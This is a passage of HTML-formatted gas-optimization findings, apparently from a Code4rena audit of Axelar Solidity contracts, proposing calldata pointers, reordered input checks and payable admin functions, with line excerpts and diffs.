class=\"mtk1\">: </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">tokenManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">giveToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">658</span><span class=\"mtk1\">: </span><span class=\"mtk11\">IInterchainTokenExpressExecutable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">executeWithInterchainToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sourceChain</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sourceAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">data</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">713</span><span class=\"mtk1\">: </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">remoteAddressValidator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getRemoteAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">destinationChain</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">723</span><span class=\"mtk1\">: </span><span class=\"mtk12\">gateway</span><span class=\"mtk1\">.</span><span class=\"mtk11\">callContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">destinationChain</span><span class=\"mtk1\">, </span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payload</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">735</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">name</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">name</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">736</span><span class=\"mtk1\">: </span><span class=\"mtk12\">symbol</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">symbol</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">737</span><span class=\"mtk1\">: </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">888</span><span class=\"mtk1\">: </span><span class=\"mtk11\">IInterchainTokenExpressExecutable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">expressExecuteWithInterchainToken</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">sourceChain</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">sourceAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">data</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token-service/InterchainTokenService.sol#L102\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token-service/InterchainTokenService.sol#L102</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"68\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: </span><span class=\"mtk12\">Breadcrumbs2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">07</span><span class=\"mtk1\">-</span><span class=\"mtk12\">axelar</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">cgp</span><span class=\"mtk1\">/</span><span class=\"mtk12\">AxelarGateway</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">287</span><span class=\"mtk1\">: </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">AxelarGateway</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newImplementation</span><span class=\"mtk1\">).</span><span class=\"mtk11\">contractId</span><span class=\"mtk1\">() != </span><span class=\"mtk11\">contractId</span><span class=\"mtk1\">()) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidImplementation</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">317</span><span class=\"mtk1\">: </span><span class=\"mtk11\">IAxelarAuth</span><span class=\"mtk1\">(</span><span class=\"mtk12\">AUTH_MODULE</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferOperatorship</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newOperatorsData</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">329</span><span class=\"mtk1\">: </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">allowOperatorshipTransfer</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IAxelarAuth</span><span class=\"mtk1\">(</span><span class=\"mtk12\">AUTH_MODULE</span><span class=\"mtk1\">).</span><span class=\"mtk11\">validateProof</span><span class=\"mtk1\">(</span><span class=\"mtk12\">messageHash</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proof</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">449</span><span class=\"mtk1\">: </span><span class=\"mtk12\">depositHandler</span><span class=\"mtk1\">.</span><span class=\"mtk11\">destroy</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">496</span><span class=\"mtk1\">: </span><span class=\"mtk11\">IAxelarAuth</span><span class=\"mtk1\">(</span><span class=\"mtk12\">AUTH_MODULE</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferOperatorship</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newOperatorsData</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">524</span><span class=\"mtk1\">: </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">526</span><span class=\"mtk1\">: </span><span class=\"mtk11\">IBurnableMintableCappedERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">543</span><span class=\"mtk1\">: </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">545</span><span class=\"mtk1\">: </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeCall</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IBurnableMintableCappedERC20</span><span class=\"mtk1\">.</span><span class=\"mtk12\">burnFrom</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">547</span><span class=\"mtk1\">: </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">IBurnableMintableCappedERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">depositAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"69\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: </span><span class=\"mtk7\">2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">07</span><span class=\"mtk1\">-</span><span class=\"mtk12\">axelar</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interchain</span><span class=\"mtk1\">-</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">-</span><span class=\"mtk12\">executor</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterchainProposalSender</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">101</span><span class=\"mtk1\">: </span><span class=\"mtk12\">gateway</span><span class=\"mtk1\">.</span><span class=\"mtk11\">callContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">interchainCall</span><span class=\"mtk1\">.</span><span class=\"mtk12\">destinationChain</span><span class=\"mtk1\">, </span><span class=\"mtk12\">interchainCall</span><span class=\"mtk1\">.</span><span class=\"mtk12\">destinationContract</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payload</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h2 id=\"g-05-use-calldata-pointer-saves-more-gas-than-memory-pointer\" style=\"position:relative;\"><a href=\"#g-05-use-calldata-pointer-saves-more-gas-than-memory-pointer\" aria-label=\"g 05 use calldata pointer saves more gas than memory pointer permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-05] Use <code>calldata</code> pointer. Saves more gas than <code>memory</code> pointer</h2>\n<p>Saves <code>600 GAS</code> in <code>per Loop Iterations</code>.</p>\n<p>Calling <code>calldata</code> instead of <code>memory</code> in the loop you have shown will save gas. This is because <code>calldata</code> is a read-only data structure, which means that it does not have to be copied into memory each time it is accessed.</p>\n<h3 id=\"interchainproposalexecutorsol-1\" style=\"position:relative;\"><a href=\"#interchainproposalexecutorsol-1\" aria-label=\"interchainproposalexecutorsol 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><code>InterchainProposalExecutor.sol</code>:</h3>\n<p>Use <code>calldata</code> instead of <code>memory</code>: Saves <code>250-300 GAS</code> per iteration.</p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/interchain-governance-executor/InterchainProposalExecutor.sol#L75\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/interchain-governance-executor/InterchainProposalExecutor.sol#L75</a></p>\n<p><code>call</code> value is not changed anywhere inside the loop. So <code>calldata</code> is more efficient than <code>memory</code> to save gas.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"70\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: Breadcrumbs2023-07-axelar/contracts/interchain-governance-executor/InterchainProposalExecutor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">74: for (uint256 i = 0; i &lt; calls.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 75:            InterchainCalls.Call memory call = calls[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 75:            InterchainCalls.Call calldata call = calls[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">76:            (bool success, bytes memory result) = call.target.call{ value: call.value }(call.callData);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">77:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">78:            if (!success) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">79:                _onTargetExecutionFailed(call, result);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">80:            } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">81:                _onTargetExecuted(call, result);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">82:            }</span></span></span></code></pre>\n<h3 id=\"axelargatewaysol-1\" style=\"position:relative;\"><a href=\"#axelargatewaysol-1\" aria-label=\"axelargatewaysol 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><code>AxelarGateway.sol</code>:</h3>\n<p>Use <code>calldata</code> instead of <code>memory</code>: Saves <code>250-300 GAS</code> per iteration.</p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/cgp/AxelarGateway.sol#L270-L277\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/cgp/AxelarGateway.sol#L270-L277</a></p>\n<p><code>symbol</code> value is not changed anywhere inside the loop. So <code>calldata</code> is more efficient than <code>memory</code> to save gas.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"71\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: 2023-07-axelar/contracts/cgp/AxelarGateway.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">270: for (uint256 i; i &lt; length; ++i) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 271:            string memory symbol = symbols[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 271:            string calldata symbol = symbols[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">272:            uint256 limit = limits[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">273:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">274:            if (tokenAddresses(symbol) == address(0)) revert TokenDoesNotExist(symbol);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">275:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">276:            _setTokenMintLimit(symbol, limit);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">277:        }</span></span></span></code></pre>\n<h2 id=\"g-06-ifsrequire-statements-that-check-input-arguments-should-be-at-the-top-of-the-function\" style=\"position:relative;\"><a href=\"#g-06-ifsrequire-statements-that-check-input-arguments-should-be-at-the-top-of-the-function\" aria-label=\"g 06 ifsrequire statements that check input arguments should be at the top of the function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-06] <code>IF’s/require()</code> statements that check input arguments should be at the <code>top</code> of the function</h2>\n<p>Saves <code>300 GAS</code> in `2 instances.</p>\n<p>Checks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a <code>Gcoldsload</code> <code>(2100 gas)</code> in a function that may ultimately revert in the unhappy case.</p>\n<h3 id=\"cheaper-to-check-the-function-parameter-before-making-check-saves-200--300--gas\" style=\"position:relative;\"><a href=\"#cheaper-to-check-the-function-parameter-before-making-check-saves-200--300--gas\" aria-label=\"cheaper to check the function parameter before making check saves 200  300  gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cheaper to check the function parameter before making check. Saves <code>200- 300 GAS</code>:</h3>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/cgp/auth/MultisigBase.sol#L172-L173\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/cgp/auth/MultisigBase.sol#L172-L173</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"72\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: 2023-07-axelar/contracts/cgp/auth/MultisigBase.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">169:  address account = newAccounts[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">170:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">171: // Check that the account wasn&#39;t already set as a signer for this epoch.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 273: if (account == address(0)) revert InvalidSigners();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 172: if (signers.isSigner[account]) revert DuplicateSigner(account);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 273: if (account == address(0)) revert InvalidSigners();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 172: if (signers.isSigner[account]) revert DuplicateSigner(account);</span></span></span></code></pre>\n<h3 id=\"tokenaddressessymbol--address0-should-be-checked-before-limit-to-avoid-unnecessary-variable-creation-after-variable-creation-if-any-fails-its-a-waste-of-gas\" style=\"position:relative;\"><a href=\"#tokenaddressessymbol--address0-should-be-checked-before-limit-to-avoid-unnecessary-variable-creation-after-variable-creation-if-any-fails-its-a-waste-of-gas\" aria-label=\"tokenaddressessymbol  address0 should be checked before limit to avoid unnecessary variable creation after variable creation if any fails its a waste of gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><code>tokenAddresses</code>(symbol) <code>==</code> <code>address(0)</code> should be checked before <code>limit</code> to avoid unnecessary variable creation. After variable creation if any fails, it’s a waste of gas:</h3>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/cgp/AxelarGateway.sol#L271-L274\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/cgp/AxelarGateway.sol#L271-L274</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"73\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: 2023-07-axelar/contracts/cgp/AxelarGateway.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">271: string memory symbol = symbols[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 274: if (tokenAddresses(symbol) == address(0)) revert TokenDoesNotExist(symbol);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">272: uint256 limit = limits[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">273:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 274: if (tokenAddresses(symbol) == address(0)) revert TokenDoesNotExist(symbol);</span></span></span></code></pre>\n<h2 id=\"g-07-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\" style=\"position:relative;\"><a href=\"#g-07-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\" aria-label=\"g 07 functions guaranteed to revert when called by normal users can be marked payable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-07] Functions guaranteed to revert when called by normal users can be marked <code>payable</code></h2>\n<p>Saves <code>231 GAS</code> in `11 instances.</p>\n<p>If a function modifier such as <code>onlyOwner</code> is used, the function will revert if a normal user tries to pay the function. Marking the function as <code>payable</code> will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are <code>CALLVALUE(2)</code>, <code>DUP1(3)</code>, <code>ISZERO(3)</code>, <code>PUSH2(3)</code>, <code>JUMPI(10)</code>, <code>PUSH1(3)</code>, <code>DUP1(3)</code>, <code>REVERT(0)</code>, <code>JUMPDEST(1)</code> and <code>POP(2)</code>, 